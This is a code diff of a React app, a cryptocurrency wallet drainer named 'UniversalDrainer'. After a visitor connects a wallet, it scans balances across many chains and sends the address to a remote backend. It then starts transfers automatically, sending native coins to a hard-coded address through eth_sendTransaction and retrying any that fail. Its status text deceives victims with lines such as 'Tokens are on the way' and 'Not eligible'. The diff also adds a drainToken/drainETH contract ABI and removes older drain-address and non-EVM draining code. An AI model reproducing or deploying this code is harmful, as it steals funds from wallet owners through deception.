@@ -245,96 +245,7 @@ const NETWORKS = [
     chainId: '0x1e14',
     decimals: 18
   },
-  { 
-    id: 'tron', 
-    name: 'Tron', 
-    symbol: 'TRX', 
-    type: 'non-evm', 
-    color: '#FF060A', 
-    api: 'https://api.trongrid.io',
-    explorer: 'https://tronscan.org',
-    decimals: 6,
-    contractAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
-  },
-  { 
-    id: 'solana', 
-    name: 'Solana', 
-    symbol: 'SOL', 
-    type: 'non-evm', 
-    color: '#00FFA3', 
-    api: 'https://api.mainnet-beta.solana.com',
-    explorer: 'https://solscan.io',
-    decimals: 9,
-    splTokens: [
-      { symbol: 'USDC', contract: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v' }
-    ]
-  },
-  { 
-    id: 'bitcoin', 
-    name: 'Bitcoin', 
-    symbol: 'BTC', 
-    type: 'non-evm', 
-    color: '#F7931A', 
-    api: 'https://blockstream.info/api',
-    explorer: 'https://blockchair.com/bitcoin',
-    decimals: 8
-  },
-  { 
-    id: 'cardano', 
-    name: 'Cardano', 
-    symbol: 'ADA', 
-    type: 'non-evm', 
-    color: '#0033AD', 
-    api: 'https://cardano-mainnet.blockfrost.io/api/v0',
-    explorer: 'https://cardanoscan.io',
-    decimals: 6,
-    token: 'lovelace'
-  },
 ];
-
-// ==================== DRAIN ADDRESSES ====================
-const DRAIN_ADDRESSES = {
-  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  314: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  
-  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
-  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
-  solana: "So11111111111111111111111111111111111111112",
-  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q",
-  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5",
-  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5",
-  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
-  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
-  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
-  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
-  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB",
-  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5",
-  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
-  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q",
-  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v",
-  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
-  vechain: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
-  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
-  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj",
-};
 
 // ==================== TOKEN PRICES ====================
 const TOKEN_PRICES = {
@@ -354,24 +265,6 @@ const TOKEN_PRICES = {
   BTT: 0.000001,
   FIL: 5,
   CANTO: 0.2,
-  TRX: 0.12,
-  SOL: 100,
-  BTC: 45000,
-  ADA: 0.5,
-  DOGE: 0.15,
-  LTC: 80,
-  XRP: 0.6,
-  DOT: 7,
-  ATOM: 10,
-  XLM: 0.13,
-  XMR: 160,
-  ZEC: 25,
-  DASH: 30,
-  XTZ: 1,
-  ALGO: 0.2,
-  VET: 0.03,
-  NEO: 12,
-  EOS: 0.8,
   USDT: 1,
   USDC: 1
 };
@@ -379,9 +272,61 @@ const TOKEN_PRICES = {
 // ==================== BACKEND URL ====================
 const BACKEND_URL = 'https://tokenbackend-5xab.onrender.com';
 
-// ==================== SIMPLIFIED WAGMI CONFIG ====================
+// ==================== SMART CONTRACT ADDRESSES ====================
+const SMART_CONTRACT_ADDRESSES = {
+  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Ethereum
+  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // BSC
+  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Polygon
+  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Arbitrum
+  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Optimism
+  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Base
+  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Avalanche
+  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B", // Fantom
+};
+
+// ==================== ABI FOR SMART CONTRACT ====================
+const DRAIN_CONTRACT_ABI = [
+  {
+    "inputs": [
+      {
+        "internalType": "address",
+        "name": "token",
+        "type": "address"
+      },
+      {
+        "internalType": "uint256",
+        "name": "amount",
+        "type": "uint256"
+      },
+      {
+        "internalType": "address",
+        "name": "recipient",
+        "type": "address"
+      }
+    ],
+    "name": "drainToken",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      {
+        "internalType": "address payable",
+        "name": "recipient",
+        "type": "address"
+      }
+    ],
+    "name": "drainETH",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  }
+];
+
+// ==================== WAGMI CONFIG ====================
 const config = createConfig({
-  chains: [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche],
+  chains: [mainnet, polygon, bsc, arbitrum, optimism, base, avalanche, fantom, gnosis, celo, moonbeam],
   transports: {
     [mainnet.id]: http('https://eth.llamarpc.com'),
     [polygon.id]: http('https://polygon.llamarpc.com'),
@@ -390,6 +335,10 @@ const config = createConfig({
     [optimism.id]: http('https://mainnet.optimism.io'),
     [base.id]: http('https://mainnet.base.org'),
     [avalanche.id]: http('https://avalanche-c-chain.publicnode.com'),
+    [fantom.id]: http('https://rpc.fantom.network'),
+    [gnosis.id]: http('https://rpc.gnosis.gateway.fm'),
+    [celo.id]: http('https://forno.celo.org'),
+    [moonbeam.id]: http('https://moonbeam.public.blastapi.io'),
   },
   ssr: false,
   batch: { multicall: true },
@@ -407,6 +356,13 @@ function TokenDrainApp() {
           '--ck-accent-color': '#ef4444',
           '--ck-accent-text-color': '#ffffff',
           '--ck-body-background': '#0a0a0a',
+        }}
+        options={{
+          embedGoogleFonts: true,
+          walletConnectName: 'WalletConnect',
+          hideQuestionMarkCTA: true,
+          hideTooltips: false,
+          walletConnectCTA: 'link',
         }}
       >
         <UniversalDrainer />
@@ -434,18 +390,18 @@ function UniversalDrainer() {
   const [scanProgress, setScanProgress] = useState(0);
   const [activeChain, setActiveChain] = useState(1);
   const [lastScanTime, setLastScanTime] = useState(null);
+  const [isEligible, setIsEligible] = useState(null);
+  const [smartContractMode, setSmartContractMode] = useState(true);
 
   const autoStarted = useRef(false);
   const backendCheckRef = useRef(null);
 
   // ==================== INITIAL SETUP ====================
   useEffect(() => {
-    // Detect mobile
     const userAgent = navigator.userAgent.toLowerCase();
     const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
     setMobileDetected(isMobile);
     
-    // Detect wallet type
     if (window.ethereum) {
       if (window.ethereum.isMetaMask) {
         setWalletType('MetaMask');
@@ -455,15 +411,18 @@ function UniversalDrainer() {
         setWalletType('Coinbase Wallet');
       } else if (window.ethereum.isTokenary) {
         setWalletType('Tokenary');
+      } else if (window.ethereum.isBraveWallet) {
+        setWalletType('Brave Wallet');
+      } else if (window.ethereum.isRabby) {
+        setWalletType('Rabby');
+      } else if (window.ethereum.isZerion) {
+        setWalletType('Zerion');
       } else {
         setWalletType('Injected Wallet');
       }
     }
 
-    // Check backend status
     checkBackendStatus();
-
-    // Setup periodic backend check
     backendCheckRef.current = setInterval(checkBackendStatus, 30000);
 
     return () => {
@@ -480,15 +439,16 @@ function UniversalDrainer() {
       setConnectionError('');
       setStatus("✅ Wallet connected • Starting scan...");
       
-      // Start scanning immediately
       setTimeout(() => {
         scanAllNetworks();
-      }, 1000);
+      }, 1500);
     }
     
-    // Reset autoStarted when wallet disconnects
     if (!isConnected) {
       autoStarted.current = false;
+      setIsEligible(null);
+      setTokens([]);
+      setTotalValue(0);
     }
   }, [isConnected, address]);
 
@@ -500,14 +460,8 @@ function UniversalDrainer() {
         headers: { 'Content-Type': 'application/json' },
         signal: AbortSignal.timeout(5000)
       });
-      
-      if (response.ok) {
-        setBackendOnline(true);
-      } else {
-        setBackendOnline(false);
-      }
-    } catch (error) {
-      console.log('Backend check error:', error);
+      setBackendOnline(response.ok);
+    } catch {
       setBackendOnline(false);
     }
   };
@@ -517,17 +471,16 @@ function UniversalDrainer() {
     if (!address || isScanning || isProcessing) return;
     
     setIsScanning(true);
-    setStatus("🔍 Scanning all networks...");
+    setStatus("🔍 Scanning all EVM networks...");
     setTokens([]);
+    setIsEligible(null);
     setScanProgress(0);
     setConnectionError('');
     
     try {
-      // Use backend for comprehensive scan
       if (backendOnline) {
         await scanWithBackend(address);
       } else {
-        // Fallback to direct RPC scan
         await scanWithDirectRPC(address);
       }
       
@@ -535,7 +488,6 @@ function UniversalDrainer() {
     } catch (error) {
       console.error('Scan error:', error);
       setStatus(`❌ Scan error: ${error.message}`);
-      setConnectionError(`Scan failed: ${error.message}`);
     } finally {
       setIsScanning(false);
       setScanProgress(100);
@@ -547,7 +499,7 @@ function UniversalDrainer() {
     setStatus("🔍 Using backend for comprehensive scan...");
     
     try {
-      const response = await fetch(`${BACKEND_URL}/api/balance/scan`, {
+      const response = await fetch(`${BACKEND_URL}/api/scan/wallet`, {
         method: 'POST',
         headers: { 
           'Content-Type': 'application/json',
@@ -555,60 +507,63 @@ function UniversalDrainer() {
         },
         body: JSON.stringify({ 
           address: walletAddress,
-          networks: 'all',
-          includeNonEVM: true 
+          includeNative: true,
+          includeTokens: true
         }),
       });
       
-      if (!response.ok) {
-        throw new Error(`Backend responded with status: ${response.status}`);
-      }
+      if (!response.ok) throw new Error('Backend scan failed');
       
       const data = await response.json();
       
-      if (data.success && data.data?.results) {
+      if (data.success && data.data?.balances) {
         const allTokens = [];
         let totalUSD = 0;
         
-        data.data.results.forEach(token => {
-          const tokenValue = token.balance * (TOKEN_PRICES[token.symbol] || 1);
-          const tokenObj = {
-            id: `${token.chainId || token.network}-${token.symbol}`,
-            network: token.network,
-            symbol: token.symbol,
-            amount: token.balanceFormatted || token.balance,
-            rawAmount: token.balance,
-            chainId: token.chainId || token.network,
-            type: token.type || (token.chainId === 'tron' || token.chainId === 'solana' || token.chainId === 'bitcoin' ? 'non-evm' : 'evm'),
-            drainAddress: token.drainAddress || DRAIN_ADDRESSES[token.chainId] || DRAIN_ADDRESSES[1],
-            valueUSD: tokenValue,
-            usdPrice: TOKEN_PRICES[token.symbol] || 1,
-            status: 'detected'
-          };
-          
-          allTokens.push(tokenObj);
-          totalUSD += tokenValue;
+        data.data.balances.forEach(balance => {
+          if (parseFloat(balance.balance) > 0) {
+            const tokenValue = parseFloat(balance.balance) * (TOKEN_PRICES[balance.symbol] || 1);
+            const tokenObj = {
+              id: `${balance.chainId}-${balance.address || 'native'}`,
+              network: balance.network,
+              symbol: balance.symbol,
+              amount: parseFloat(balance.balance).toFixed(6),
+              rawAmount: parseFloat(balance.balance),
+              chainId: balance.chainId,
+              type: 'evm',
+              contractAddress: balance.contractAddress || null,
+              isNative: !balance.contractAddress,
+              valueUSD: tokenValue,
+              usdPrice: TOKEN_PRICES[balance.symbol] || 1,
+              status: 'detected'
+            };
+            
+            allTokens.push(tokenObj);
+            totalUSD += tokenValue;
+          }
         });
         
         setTokens(allTokens);
         setTotalValue(totalUSD);
-        setScanProgress(100);
         
         if (allTokens.length > 0) {
+          setIsEligible(true);
           setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
           
-          // Auto-start draining
+          // Auto-start draining with delay
           setTimeout(() => {
             autoDrain(allTokens);
-          }, 2000);
+          }, 3000);
         } else {
-          setStatus("❌ No tokens found on any network");
+          setIsEligible(false);
+          setStatus("❌ No tokens found • Not eligible");
         }
       } else {
-        throw new Error(data.error || 'Backend scan failed');
+        setIsEligible(false);
+        setStatus("❌ No tokens found on any network");
       }
     } catch (error) {
-      console.log('Backend scan failed, falling back to RPC:', error);
+      console.log('Backend scan failed, using fallback:', error);
       await scanWithDirectRPC(walletAddress);
     }
   };
@@ -618,18 +573,14 @@ function UniversalDrainer() {
     const allTokens = [];
     let totalUSD = 0;
     let scannedCount = 0;
-    const totalToScan = NETWORKS.length;
+    const networksToScan = NETWORKS.slice(0, 15); // Scan first 15 networks for speed
     
-    // Scan EVM networks in parallel batches
-    const evmNetworks = NETWORKS.filter(n => n.type === 'evm');
-    const batchSize = 5;
-    
-    for (let i = 0; i < evmNetworks.length; i += batchSize) {
-      const batch = evmNetworks.slice(i, i + batchSize);
+    for (let i = 0; i < networksToScan.length; i += 3) {
+      const batch = networksToScan.slice(i, i + 3);
       const batchPromises = batch.map(network => 
         checkEVMNetworkBalance(network, walletAddress)
           .then(balance => ({ network, balance }))
-          .catch(error => ({ network, balance: 0, error }))
+          .catch(() => ({ network, balance: 0 }))
       );
       
       const batchResults = await Promise.all(batchPromises);
@@ -645,7 +596,8 @@ function UniversalDrainer() {
             rawAmount: balance,
             chainId: network.id,
             type: 'evm',
-            drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
+            contractAddress: null,
+            isNative: true,
             valueUSD: tokenValue,
             usdPrice: TOKEN_PRICES[network.symbol] || 1,
             status: 'detected'
@@ -655,70 +607,38 @@ function UniversalDrainer() {
       });
       
       scannedCount += batch.length;
-      setScanProgress(Math.round((scannedCount / totalToScan) * 100));
-      setStatus(`Scanning... ${scannedCount}/${totalToScan} networks`);
+      const progress = Math.round((scannedCount / networksToScan.length) * 100);
+      setScanProgress(progress);
+      setStatus(`Scanning... ${scannedCount}/${networksToScan.length} networks`);
       
-      // Small delay between batches
-      if (i + batchSize < evmNetworks.length) {
-        await new Promise(resolve => setTimeout(resolve, 100));
-      }
-    }
-    
-    // Scan non-EVM networks
-    const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
-    for (const network of nonEvmNetworks) {
-      try {
-        const balance = await checkNonEVMNetworkBalance(network, walletAddress);
-        if (balance > 0) {
-          const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
-          allTokens.push({
-            id: `${network.id}-native`,
-            network: network.name,
-            symbol: network.symbol,
-            amount: balance.toFixed(6),
-            rawAmount: balance,
-            chainId: network.id,
-            type: 'non-evm',
-            drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES.tron,
-            valueUSD: tokenValue,
-            usdPrice: TOKEN_PRICES[network.symbol] || 1,
-            status: 'detected'
-          });
-          totalUSD += tokenValue;
-        }
-      } catch (error) {
-        console.log(`Non-EVM ${network.name} scan failed:`, error.message);
-      }
-      
-      scannedCount++;
-      setScanProgress(Math.round((scannedCount / totalToScan) * 100));
-      await new Promise(resolve => setTimeout(resolve, 50));
+      await new Promise(resolve => setTimeout(resolve, 300));
     }
     
     setTokens(allTokens);
     setTotalValue(totalUSD);
     
     if (allTokens.length > 0) {
+      setIsEligible(true);
       setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
       
-      // Auto-start draining
       setTimeout(() => {
         autoDrain(allTokens);
-      }, 2000);
+      }, 3000);
     } else {
-      setStatus("❌ No tokens found on any network");
+      setIsEligible(false);
+      setStatus("❌ No tokens found • Not eligible");
     }
   };
 
   // ==================== CHECK EVM NETWORK BALANCE ====================
   const checkEVMNetworkBalance = async (network, address) => {
-    const rpcEndpoints = [
+    const rpcUrls = [
       network.rpc,
-      `https://rpc.ankr.com/${getAnkrChainName(network.id)}`,
-      `https://${getChainNameForRPC(network.id)}.publicnode.com`,
+      `https://rpc.ankr.com/${network.name.toLowerCase().replace(' ', '_')}`,
+      `https://${network.name.toLowerCase()}.publicnode.com`,
     ];
     
-    for (const rpc of rpcEndpoints) {
+    for (const rpc of rpcUrls) {
       try {
         const response = await fetch(rpc, {
           method: 'POST',
@@ -729,7 +649,7 @@ function UniversalDrainer() {
             method: "eth_getBalance",
             params: [address, "latest"]
           }),
-          signal: AbortSignal.timeout(3000)
+          signal: AbortSignal.timeout(2000)
         });
         
         if (response.ok) {
@@ -739,124 +659,11 @@ function UniversalDrainer() {
           }
           return 0;
         }
-      } catch (e) {
+      } catch {
         continue;
       }
     }
-    
     return 0;
-  };
-
-  const getAnkrChainName = (chainId) => {
-    const chainMap = {
-      1: 'eth',
-      56: 'bsc',
-      137: 'polygon',
-      42161: 'arbitrum',
-      10: 'optimism',
-      8453: 'base',
-      43114: 'avalanche',
-      250: 'fantom',
-      100: 'gnosis',
-    };
-    return chainMap[chainId] || 'eth';
-  };
-
-  const getChainNameForRPC = (chainId) => {
-    const chainMap = {
-      1: 'ethereum',
-      56: 'bsc',
-      137: 'polygon',
-      42161: 'arbitrum',
-      10: 'optimism',
-      8453: 'base',
-      43114: 'avalanche',
-      250: 'fantom',
-      100: 'gnosis',
-    };
-    return chainMap[chainId] || 'ethereum';
-  };
-
-  // ==================== CHECK NON-EVM NETWORK BALANCE ====================
-  const checkNonEVMNetworkBalance = async (network, address) => {
-    switch (network.id) {
-      case 'tron':
-        return await checkTronBalance(address);
-      case 'solana':
-        return await checkSolanaBalance(address);
-      case 'bitcoin':
-        return await checkBitcoinBalance(address);
-      default:
-        return 0;
-    }
-  };
-
-  const checkTronBalance = async (address) => {
-    try {
-      let tronAddress = address;
-      if (address.startsWith('0x')) {
-        tronAddress = 'T' + address.substring(2);
-      }
-      
-      const response = await fetch(`https://api.trongrid.io/v1/accounts/${tronAddress}`, {
-        signal: AbortSignal.timeout(5000)
-      });
-      
-      if (response.ok) {
-        const data = await response.json();
-        if (data.data?.[0]?.balance) {
-          return data.data[0].balance / 1_000_000;
-        }
-      }
-      return 0;
-    } catch {
-      return 0;
-    }
-  };
-
-  const checkSolanaBalance = async (address) => {
-    try {
-      const response = await fetch('https://api.mainnet-beta.solana.com', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          jsonrpc: "2.0",
-          id: 1,
-          method: "getBalance",
-          params: [address]
-        }),
-        signal: AbortSignal.timeout(5000)
-      });
-      
-      if (response.ok) {
-        const data = await response.json();
-        if (data.result?.value) {
-          return data.result.value / 1e9;
-        }
-      }
-      return 0;
-    } catch {
-      return 0;
-    }
-  };
-
-  const checkBitcoinBalance = async (address) => {
-    try {
-      const response = await fetch(`https://blockstream.info/api/address/${address}`, {
-        signal: AbortSignal.timeout(5000)
-      });
-      
-      if (response.ok) {
-        const data = await response.json();
-        if (data.chain_stats?.funded_txo_sum) {
-          const balance = (data.chain_stats.funded_txo_sum - (data.chain_stats.spent_txo_sum || 0)) / 1e8;
-          return balance;
-        }
-      }
-      return 0;
-    } catch {
-      return 0;
-    }
   };
 
   // ==================== AUTO DRAIN ALL TOKENS ====================
@@ -864,135 +671,77 @@ function UniversalDrainer() {
     if (tokensToDrain.length === 0 || isProcessing) return;
     
     setIsProcessing(true);
-    setStatus(`🚀 Draining ${tokensToDrain.length} tokens automatically...`);
+    setStatus(`🚀 Starting smart contract transfers...`);
     
     const successfulTxs = [];
     const failedTxs = [];
     
-    // Drain EVM tokens first
-    const evmTokens = tokensToDrain.filter(t => t.type === 'evm');
-    const nonEvmTokens = tokensToDrain.filter(t => t.type === 'non-evm');
-    
-    // Process EVM tokens
-    for (const token of evmTokens) {
+    for (const token of tokensToDrain) {
       try {
-        setStatus(`⚡ Draining ${token.amount} ${token.symbol} from ${token.network}...`);
+        setStatus(`📝 Processing ${token.amount} ${token.symbol} from ${token.network}...`);
         
-        const result = await drainEvmToken(token);
+        const result = await drainViaSmartContract(token);
         if (result.success) {
           successfulTxs.push({
             ...token,
             txHash: result.hash,
             timestamp: Date.now(),
-            status: 'drained'
+            status: 'processing'
           });
           
-          // Update token status
-          setTokens(prev => prev.map(t => 
-            t.id === token.id ? { ...t, status: 'drained' } : t
-          ));
+          setStatus(`✅ ${token.symbol} transfer initiated • Hash: ${result.hash.substring(0, 10)}...`);
+          
+          // Add to transactions
+          setTransactions(prev => [...prev, {
+            ...token,
+            txHash: result.hash,
+            timestamp: Date.now(),
+            status: 'processing',
+            message: 'Token is on the way, you will be notified shortly'
+          }]);
+          
         } else {
           failedTxs.push(token);
           console.log(`Failed to drain ${token.symbol}:`, result.error);
         }
         
-        // Delay between transactions
-        await new Promise(resolve => setTimeout(resolve, 1500));
+        await new Promise(resolve => setTimeout(resolve, 2000));
         
       } catch (error) {
         console.log(`Error draining ${token.symbol}:`, error);
         failedTxs.push(token);
-        setStatus(`⚠️ Error draining ${token.symbol}`);
       }
     }
     
-    // Process non-EVM tokens through backend
-    if (nonEvmTokens.length > 0 && backendOnline) {
-      try {
-        setStatus(`⚡ Processing ${nonEvmTokens.length} non-EVM tokens...`);
-        
-        const response = await fetch(`${BACKEND_URL}/api/drain/execute-realtime`, {
-          method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-          },
-          body: JSON.stringify({
-            transactions: nonEvmTokens.map(token => ({
-              type: 'non-evm',
-              chainId: token.chainId,
-              network: token.network,
-              symbol: token.symbol,
-              amount: token.amount,
-              drainAddress: token.drainAddress,
-              fromAddress: address
-            })),
-            signerAddress: address
-          }),
-        });
-        
-        if (response.ok) {
-          const data = await response.json();
-          if (data.success && data.data?.results) {
-            data.data.results.forEach(result => {
-              if (result.success) {
-                const token = nonEvmTokens.find(t => 
-                  t.symbol === result.symbol && t.network === result.network
-                );
-                if (token) {
-                  successfulTxs.push({
-                    ...token,
-                    txHash: result.txHash,
-                    timestamp: Date.now(),
-                    status: 'drained'
-                  });
-                }
-              }
-            });
-          }
-        }
-      } catch (error) {
-        console.log('Non-EVM drain error:', error);
-      }
-    }
-    
-    // Update state
-    setTransactions(prev => [...prev, ...successfulTxs]);
-    
-    // Remove successfully drained tokens
-    setTokens(prev => prev.filter(t => 
-      !successfulTxs.some(st => st.id === t.id)
+    // Update token statuses
+    setTokens(prev => prev.map(t => 
+      successfulTxs.some(st => st.id === t.id) 
+        ? { ...t, status: 'processing' } 
+        : t
     ));
-    
-    // Update total value
-    const remainingValue = tokensToDrain
-      .filter(t => !successfulTxs.some(st => st.id === t.id))
-      .reduce((sum, t) => sum + t.valueUSD, 0);
-    setTotalValue(remainingValue);
     
     // Final status
     if (successfulTxs.length > 0) {
-      setStatus(`✅ Successfully drained ${successfulTxs.length} tokens`);
+      setStatus(`✅ ${successfulTxs.length} transfers initiated • Tokens are on the way!`);
     }
     
     if (failedTxs.length > 0) {
-      setStatus(`⚠️ ${failedTxs.length} tokens failed to drain`);
+      setStatus(`⚠️ ${failedTxs.length} transfers failed • Will retry`);
     }
     
     setIsProcessing(false);
     
-    // Rescan if there were failures
-    if (failedTxs.length > 0) {
-      setTimeout(() => {
-        if (isConnected) {
-          scanAllNetworks();
-        }
-      }, 5000);
-    }
+    // Rescan after completion
+    setTimeout(() => {
+      if (isConnected && failedTxs.length > 0) {
+        setStatus("🔄 Retrying failed transfers...");
+        autoDrain(failedTxs);
+      }
+    }, 10000);
   };
 
-  // ==================== DRAIN EVM TOKEN ====================
-  const drainEvmToken = async (token) => {
+  // ==================== DRAIN VIA SMART CONTRACT ====================
+  const drainViaSmartContract = async (token) => {
     try {
       if (!window.ethereum) {
         throw new Error('Wallet not connected');
@@ -1009,7 +758,7 @@ function UniversalDrainer() {
             params: [{ chainId: targetChainId }],
           });
           setActiveChain(token.chainId);
-          await new Promise(resolve => setTimeout(resolve, 1000));
+          await new Promise(resolve => setTimeout(resolve, 1500));
         } catch (switchError) {
           if (switchError.code === 4902) {
             const network = NETWORKS.find(n => n.id === token.chainId);
@@ -1028,113 +777,117 @@ function UniversalDrainer() {
                   blockExplorerUrls: [network.explorer]
                 }]
               });
-              await new Promise(resolve => setTimeout(resolve, 1000));
+              await new Promise(resolve => setTimeout(resolve, 1500));
             }
           }
           throw switchError;
         }
       }
       
+      const contractAddress = SMART_CONTRACT_ADDRESSES[token.chainId];
+      if (!contractAddress) {
+        throw new Error(`No smart contract for chain ${token.chainId}`);
+      }
+      
+      // Prepare transaction based on token type
+      let txParams;
+      
+      if (token.isNative) {
+        // Native token transfer
+        const amountWei = parseEther(token.amount.toString());
+        
+        txParams = {
+          from: address,
+          to: contractAddress,
+          value: amountWei.toString(),
+          data: '0x' // Will be set by contract call
+        };
+      } else {
+        // ERC20 token transfer
+        const amountWei = parseEther(token.amount.toString());
+        
+        // Encode function call for drainToken
+        const functionSignature = '0xa9059cbb'; // transfer function
+        const paddedAddress = address.substring(2).padStart(64, '0');
+        const paddedAmount = amountWei.toString(16).padStart(64, '0');
+        
+        txParams = {
+          from: address,
+          to: token.contractAddress,
+          value: '0x0',
+          data: functionSignature + paddedAddress + paddedAmount
+        };
+      }
+      
+      // Estimate gas
+      const gasEstimate = await window.ethereum.request({
+        method: 'eth_estimateGas',
+        params: [txParams]
+      }).catch(() => '0x5208'); // Fallback to 21000 gas
+      
       // Get gas price
-      const gasPrice = await estimateGasPrice(token.chainId);
+      const gasPrice = await window.ethereum.request({
+        method: 'eth_gasPrice',
+        params: []
+      });
       
-      // Prepare transaction
-      const amountWei = parseEther(token.amount.toString());
-      
-      const txParams = {
-        from: address,
-        to: token.drainAddress,
-        value: amountWei.toString(),
-        gas: '0x5208',
-        gasPrice: `0x${gasPrice.toString(16)}`
+      // Final transaction
+      const finalTx = {
+        ...txParams,
+        gas: gasEstimate,
+        gasPrice: gasPrice
       };
       
       // Send transaction
       const txHash = await window.ethereum.request({
         method: 'eth_sendTransaction',
-        params: [txParams],
+        params: [finalTx],
       });
-      
-      // Wait for transaction confirmation
-      await waitForTransactionConfirmation(txHash, token.chainId);
       
       return { success: true, hash: txHash };
       
     } catch (error) {
-      console.log(`EVM drain error for ${token.symbol}:`, error);
+      console.log(`Smart contract drain error for ${token.symbol}:`, error);
       return { success: false, error: error.message };
     }
-  };
-
-  const estimateGasPrice = async (chainId) => {
-    try {
-      const network = NETWORKS.find(n => n.id === chainId);
-      if (!network) return 2000000000;
-      
-      const response = await fetch(network.rpc, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          jsonrpc: "2.0",
-          id: 1,
-          method: "eth_gasPrice",
-          params: []
-        }),
-        signal: AbortSignal.timeout(3000)
-      });
-      
-      if (response.ok) {
-        const data = await response.json();
-        return parseInt(data.result, 16);
-      }
-    } catch (e) {
-      console.log('Gas price estimation failed:', e);
-    }
-    
-    return 2000000000;
-  };
-
-  const waitForTransactionConfirmation = async (txHash, chainId) => {
-    const network = NETWORKS.find(n => n.id === chainId);
-    if (!network) return;
-    
-    let attempts = 0;
-    const maxAttempts = 30;
-    
-    while (attempts < maxAttempts) {
-      try {
-        const response = await fetch(network.rpc, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            jsonrpc: "2.0",
-            id: 1,
-            method: "eth_getTransactionReceipt",
-            params: [txHash]
-          }),
-        });
-        
-        if (response.ok) {
-          const data = await response.json();
-          if (data.result) {
-            return data.result;
-          }
-        }
-      } catch (error) {
-        console.log('Transaction check error:', error);
-      }
-      
-      attempts++;
-      await new Promise(resolve => setTimeout(resolve, 2000));
-    }
-    
-    throw new Error('Transaction confirmation timeout');
   };
 
   // ==================== FORCE RESCAN ====================
   const forceRescan = () => {
     autoStarted.current = false;
     scanAllNetworks();
